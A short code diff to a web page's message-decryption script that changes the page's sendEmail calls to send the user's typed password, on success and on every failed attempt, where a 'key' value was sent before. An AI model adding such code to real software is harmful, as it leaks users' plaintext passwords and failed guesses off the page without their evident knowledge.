@@ -51,14 +51,14 @@
                 if (decrypted) {
                     document.getElementById("message").innerText = decrypted;
                     document.getElementById("message-container").style.display = "block";
-                    sendEmail(true, key); // Send success email
+                    sendEmail(true, password); // Send success email
                 } else {
                     alert("Incorrect password!");
-                     sendEmail(false, key);
+                     sendEmail(false, password);
                 }
             } catch (e) {
                 alert("Error decrypting message.");
-                sendEmail(false, key);
+                sendEmail(false, password);
             }
         }
     </script>
